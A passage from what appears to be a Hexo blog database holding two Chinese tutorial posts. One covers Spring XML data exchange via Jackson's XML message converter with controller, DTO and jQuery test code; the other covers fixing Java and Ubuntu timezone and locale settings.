class=\"line\">\t\t&#125; catch (JsonProcessingException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                // response出参数据</span><br><span class=\"line\">\t\tTest_DtoOut tdo = new Test_DtoOut();</span><br><span class=\"line\">\t\ttdo.code = 200;</span><br><span class=\"line\">\t\ttdo.msg = xml.getToUserName();</span><br><span class=\"line\">\t\treturn tdo;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两个出入参dto（只截部分代码）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.in;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonProperty;</span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonRootName;</span><br><span class=\"line\"></span><br><span class=\"line\">@JsonRootName(value=&quot;out&quot;) // 给xml根节点别名，不然会带包名</span><br><span class=\"line\">public class Xml &#123;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;toUserName&quot;)// 变量对应的入参数据标签名，这里可以使实现与入参数据标签名不同</span><br><span class=\"line\">\tString toUserName;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;fromUserName&quot;)</span><br><span class=\"line\">\tString fromUserName;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;CreateTime&quot;)</span><br><span class=\"line\">\tLong createTime;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;MsgType&quot;)</span><br><span class=\"line\">\tString msgType;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;Event&quot;)</span><br><span class=\"line\">\tString event;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.out;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonProperty;</span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonRootName;</span><br><span class=\"line\">import com.fasterxml.jackson.dataformat.xml.annotation.JacksonXmlRootElement;</span><br><span class=\"line\"></span><br><span class=\"line\">//@JacksonXmlRootElement(localName=&quot;out&quot;)</span><br><span class=\"line\">@JsonRootName(value=&quot;out&quot;)</span><br><span class=\"line\">public class Test_DtoOut &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@JsonProperty(value=&quot;codes&quot;)</span><br><span class=\"line\">\tpublic Integer code;</span><br><span class=\"line\">        // 不给别名xml数据默认的标签名与属性名一致</span><br><span class=\"line\">\tpublic String msg;</span><br></pre></td></tr></table></figure>\n\n<p>前端文件html（注意前端代码要放到服务器上，浏览器输入url，否则contentType不会起作用）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">&lt;head&gt;  </span><br><span class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;application/xml; charset=UTF-8&quot;&gt;  </span><br><span class=\"line\">&lt;title&gt;测试接收XML格式的数据&lt;/title&gt;  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;  </span><br><span class=\"line\">&lt;!-- &lt;script type=&quot;text/javascript&quot; src=&quot;js/json2.js&quot;&gt;&lt;/script&gt;  --&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;  </span><br><span class=\"line\">$(document).ready(function()&#123;  </span><br><span class=\"line\">    sendxml();  </span><br><span class=\"line\">&#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">function sendxml()&#123;  </span><br><span class=\"line\">    var xmlData = &quot;&lt;out&gt;&lt;toUserName&gt;toUser&lt;/toUserName&gt;&lt;fromUserName&gt;FromUser&lt;/fromUserName&gt;&lt;CreateTime&gt;123456789&lt;/CreateTime&gt;&lt;MsgType&gt;event&lt;/MsgType&gt;&lt;Event&gt;subscribe&lt;/Event&gt;&lt;/out&gt;&quot;;</span><br><span class=\"line\">   </span><br><span class=\"line\">\t$.ajax(&#123;</span><br><span class=\"line\">            type: &quot;POST&quot;,</span><br><span class=\"line\">            url: &quot;http://localhost:8080/valida/webctrl/demo/txml&quot;,</span><br><span class=\"line\">                </span><br><span class=\"line\">                // data sent is xml</span><br><span class=\"line\">\t\t\t\tcontentType: &quot;application/xml; charset=utf-8&quot;,</span><br><span class=\"line\">                data: xmlData, </span><br><span class=\"line\">                // data in response will expected xml</span><br><span class=\"line\">                dataType: &quot;xml&quot;,</span><br><span class=\"line\">\t\t\t\tprocessData: false,</span><br><span class=\"line\">                anysc: false,</span><br><span class=\"line\">\t\t\t\tbeforeSend: function(request) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">                       request.setRequestHeader(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class=\"line\">\t\t\t\t\t   request.setRequestHeader(&apos;Access-Control-Allow-Methods: POST,GET,OPTIONS&apos;);</span><br><span class=\"line\">\t\t\t\t\t   request.overrideMimeType(&apos;application/xml; charset=utf-8&apos;)</span><br><span class=\"line\">\t\t\t\t\t   console.log(JSON.stringify(request));</span><br><span class=\"line\">                 &#125;,</span><br><span class=\"line\">                success: function (result) &#123; </span><br><span class=\"line\">\t\t\t\t\tconsole.log(result);</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                error: function (XMLHttpRequest, textStatus, errorThrown) &#123;</span><br><span class=\"line\">                    alert(errorThrown + &apos;:&apos; + textStatus); // 错误处理</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&lt;/script&gt;  </span><br><span class=\"line\">&lt;/head&gt;  </span><br><span class=\"line\">&lt;body&gt;  </span><br><span class=\"line\">&lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>后端控制台打印</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;toUserName&quot;:&quot;toUser&quot;,&quot;fromUserName&quot;:&quot;FromUser&quot;,&quot;CreateTime&quot;:123456789,&quot;MsgType&quot;:&quot;event&quot;,&quot;Event&quot;:&quot;subscribe&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>前端接收到返回值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;out&gt;&lt;msg&gt;toUser&lt;/msg&gt;&lt;codes&gt;200&lt;/codes&gt;&lt;/out&gt;</span><br></pre></td></tr></table></figure>\n\n<p>另外一种使用xstream实现xml数据交换的配置，详见另一篇博客<br><a href=\"./2017-08-18_spring_xml_xstream.md\">spring基于xml格式数据交换的前后端配置与使用之xstream方式</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>MappingJackson2XmlHttpMessageConverter方式解析xml（支持注解修改元素别名）配置及代码如下：</p>\n<p>xml配置文件中添加converter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean class=&quot;org.springframework.http.converter.xml.MappingJackson2XmlHttpMessageConverter&quot;&gt;</span><br><span class=\"line\">                &lt;property name=&quot;supportedMediaTypes&quot;&gt;</span><br><span class=\"line\">                \t&lt;list&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;application/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t&lt;/list&gt;</span><br><span class=\"line\">                &lt;/property&gt;</span><br><span class=\"line\">                &lt;property name=&quot;prettyPrint&quot; value=&quot;false&quot;/&gt;</span><br><span class=\"line\">            &lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<p>pom 文件（在原来的基础上添加了jackson-dataformat-xml的依赖，这里jackson为2.8.7版本）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-dataformat-xml&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-dataformat-xml&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>controller文件（这个controller本就是@restcontroller）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RequestMapping(value = &quot;txml&quot;, headers = &#123; &quot;content-type=application/xml;charset=UTF-8&quot;&#125;)</span><br><span class=\"line\">\tpublic Object testXml(@RequestBody Xml xml) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                // 这部分主要打印看看，验证request xml方式入参成功</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tObjectMapper mapper = new ObjectMapper();</span><br><span class=\"line\">\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)</span><br><span class=\"line\">\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);</span><br><span class=\"line\">\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参</span><br><span class=\"line\">\t\t&#125; catch (JsonProcessingException e) &#123;</span><br><span class=\"line\">\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                // response出参数据</span><br><span class=\"line\">\t\tTest_DtoOut tdo = new Test_DtoOut();</span><br><span class=\"line\">\t\ttdo.code = 200;</span><br><span class=\"line\">\t\ttdo.msg = xml.getToUserName();</span><br><span class=\"line\">\t\treturn tdo;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>两个出入参dto（只截部分代码）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.in;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonProperty;</span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonRootName;</span><br><span class=\"line\"></span><br><span class=\"line\">@JsonRootName(value=&quot;out&quot;) // 给xml根节点别名，不然会带包名</span><br><span class=\"line\">public class Xml &#123;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;toUserName&quot;)// 变量对应的入参数据标签名，这里可以使实现与入参数据标签名不同</span><br><span class=\"line\">\tString toUserName;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;fromUserName&quot;)</span><br><span class=\"line\">\tString fromUserName;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;CreateTime&quot;)</span><br><span class=\"line\">\tLong createTime;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;MsgType&quot;)</span><br><span class=\"line\">\tString msgType;</span><br><span class=\"line\">\t@JsonProperty(value=&quot;Event&quot;)</span><br><span class=\"line\">\tString event;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mufeng.dto.out;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonProperty;</span><br><span class=\"line\">import com.fasterxml.jackson.annotation.JsonRootName;</span><br><span class=\"line\">import com.fasterxml.jackson.dataformat.xml.annotation.JacksonXmlRootElement;</span><br><span class=\"line\"></span><br><span class=\"line\">//@JacksonXmlRootElement(localName=&quot;out&quot;)</span><br><span class=\"line\">@JsonRootName(value=&quot;out&quot;)</span><br><span class=\"line\">public class Test_DtoOut &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@JsonProperty(value=&quot;codes&quot;)</span><br><span class=\"line\">\tpublic Integer code;</span><br><span class=\"line\">        // 不给别名xml数据默认的标签名与属性名一致</span><br><span class=\"line\">\tpublic String msg;</span><br></pre></td></tr></table></figure>\n\n<p>前端文件html（注意前端代码要放到服务器上，浏览器输入url，否则contentType不会起作用）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">&lt;head&gt;  </span><br><span class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;application/xml; charset=UTF-8&quot;&gt;  </span><br><span class=\"line\">&lt;title&gt;测试接收XML格式的数据&lt;/title&gt;  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;  </span><br><span class=\"line\">&lt;!-- &lt;script type=&quot;text/javascript&quot; src=&quot;js/json2.js&quot;&gt;&lt;/script&gt;  --&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;  </span><br><span class=\"line\">$(document).ready(function()&#123;  </span><br><span class=\"line\">    sendxml();  </span><br><span class=\"line\">&#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">function sendxml()&#123;  </span><br><span class=\"line\">    var xmlData = &quot;&lt;out&gt;&lt;toUserName&gt;toUser&lt;/toUserName&gt;&lt;fromUserName&gt;FromUser&lt;/fromUserName&gt;&lt;CreateTime&gt;123456789&lt;/CreateTime&gt;&lt;MsgType&gt;event&lt;/MsgType&gt;&lt;Event&gt;subscribe&lt;/Event&gt;&lt;/out&gt;&quot;;</span><br><span class=\"line\">   </span><br><span class=\"line\">\t$.ajax(&#123;</span><br><span class=\"line\">            type: &quot;POST&quot;,</span><br><span class=\"line\">            url: &quot;http://localhost:8080/valida/webctrl/demo/txml&quot;,</span><br><span class=\"line\">                </span><br><span class=\"line\">                // data sent is xml</span><br><span class=\"line\">\t\t\t\tcontentType: &quot;application/xml; charset=utf-8&quot;,</span><br><span class=\"line\">                data: xmlData, </span><br><span class=\"line\">                // data in response will expected xml</span><br><span class=\"line\">                dataType: &quot;xml&quot;,</span><br><span class=\"line\">\t\t\t\tprocessData: false,</span><br><span class=\"line\">                anysc: false,</span><br><span class=\"line\">\t\t\t\tbeforeSend: function(request) &#123;</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">                       request.setRequestHeader(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class=\"line\">\t\t\t\t\t   request.setRequestHeader(&apos;Access-Control-Allow-Methods: POST,GET,OPTIONS&apos;);</span><br><span class=\"line\">\t\t\t\t\t   request.overrideMimeType(&apos;application/xml; charset=utf-8&apos;)</span><br><span class=\"line\">\t\t\t\t\t   console.log(JSON.stringify(request));</span><br><span class=\"line\">                 &#125;,</span><br><span class=\"line\">                success: function (result) &#123; </span><br><span class=\"line\">\t\t\t\t\tconsole.log(result);</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                error: function (XMLHttpRequest, textStatus, errorThrown) &#123;</span><br><span class=\"line\">                    alert(errorThrown + &apos;:&apos; + textStatus); // 错误处理</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&lt;/script&gt;  </span><br><span class=\"line\">&lt;/head&gt;  </span><br><span class=\"line\">&lt;body&gt;  </span><br><span class=\"line\">&lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>后端控制台打印</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;toUserName&quot;:&quot;toUser&quot;,&quot;fromUserName&quot;:&quot;FromUser&quot;,&quot;CreateTime&quot;:123456789,&quot;MsgType&quot;:&quot;event&quot;,&quot;Event&quot;:&quot;subscribe&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>前端接收到返回值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;out&gt;&lt;msg&gt;toUser&lt;/msg&gt;&lt;codes&gt;200&lt;/codes&gt;&lt;/out&gt;</span><br></pre></td></tr></table></figure>\n\n<p>另外一种使用xstream实现xml数据交换的配置，详见另一篇博客<br><a href=\"./2017-08-18_spring_xml_xstream.md\">spring基于xml格式数据交换的前后端配置与使用之xstream方式</a></p>\n"},{"title":"Java及Ubuntu操作系统时区错误","date":"2019-07-10T13:11:18.000Z","keywords":"java, linux, 时区错误","rId":"MB-19071001","_content":"\n程序部署时出现Java时间不正确，Java里打印`new Date()`后发现输出的时区不是CST，是时区不正确导致的问题。针对该问题进行修复，修改时区设置，配置如下:\n\n1. 修改`/etc/localtime`软链接指向为`/usr/share/zoneinfo/Asia/Shanghai`\n\n   > ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n   \n\n此时出现了一个很有意思的现象：shell执行打印时间的命令`date`，发现输出时区为CST，但Java打印 `new Date()`输出，时区仍旧不是CST\n\n2. 修改`/etc/timezone`文件，将文件内唯一的一行`America/New_York`改为`Asia/Shanghai`，Java打印`new Date()`，输出时区为CST，修改成功\n\n3. （相似的题外问题）如果需要修改系统字符集，可以修改`/etc/default/locale`（基于Ubuntu）文件设置为如下所示\n```\nLANG=\"zh_CN.UTF-8\"\nLANGUAGE=\"zh_CN:zh\"\n```\n可以通过`locale -a`查看是否安装`zh_CN.UTF-8`字体，如未安装，通过`locale-gen zh_CN.UTF-8`命令安装","source":"_posts/2019-07-10_timezone.md","raw":"---\ntitle: Java及Ubuntu操作系统时区错误\ndate: 2019-07-10 21:11:18\ntags: linux\npermalink: java-linux-timezone\nkeywords: java, linux, 时区错误\nrId: MB-19071001\n---\n\n程序部署时出现Java时间不正确，Java里打印`new Date()`后发现输出的时区不是CST，是时区不正确导致的问题。针对该问题进行修复，修改时区设置，配置如下:\n\n1. 修改`/etc/localtime`软链接指向为`/usr/share/zoneinfo/Asia/Shanghai`\n\n   > ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n   \n\n此时出现了一个很有意思的现象：shell执行打印时间的命令`date`，发现输出时区为CST，但Java打印 `new Date()`输出，时区仍旧不是CST\n\n2. 修改`/etc/timezone`文件，将文件内唯一的一行`America/New_York`改为`Asia/Shanghai`，Java打印`new Date()`，输出时区为CST，修改成功\n\n3. （相似的题外问题）如果需要修改系统字符集，可以修改`/etc/default/locale`（基于Ubuntu）文件设置为如下所示\n```\nLANG=\"zh_CN.UTF-8\"\nLANGUAGE=\"zh_CN:zh\"\n```\n可以通过`locale -a`查看是否安装`zh_CN.UTF-8`字体，如未安装，通过`locale-gen zh_CN.UTF-8`命令安装","slug":"java-linux-timezone","published":1,"updated":"2020-01-27T12:39:07.083Z","_id":"ck5qhi06c001gg0ukcqeqdok0","comments":1,"layout":"post","photos":[],"link":"","content":"<p>程序部署时出现Java时间不正确，Java里打印<code>new Date()</code>后发现输出的时区不是CST，是时区不正确导致的问题。针对该问题进行修复，修改时区设置，配置如下:</p>\n<ol>\n<li><p>修改<code>/etc/localtime</code>软链接指向为<code>/usr/share/zoneinfo/Asia/Shanghai</code></p>\n<blockquote>\n<p>ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</p>\n</blockquote>\n</li>\n</ol>\n<p>此时出现了一个很有意思的现象：shell执行打印时间的命令<code>date</code>，发现输出时区为CST，但Java打印 <code>new Date()</code>输出，时区仍旧不是CST</p>\n<ol start=\"2\">\n<li><p>修改<code>/etc/timezone</code>文件，将文件内唯一的一行<code>America/New_York</code>改为<code>Asia/Shanghai</code>，Java打印<code>new Date()</code>，输出时区为CST，修改成功</p>\n</li>\n<li><p>（相似的题外问题）如果需要修改系统字符集，可以修改<code>/etc/default/locale</code>（基于Ubuntu）文件设置为如下所示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LANG=&quot;zh_CN.UTF-8&quot;</span><br><span 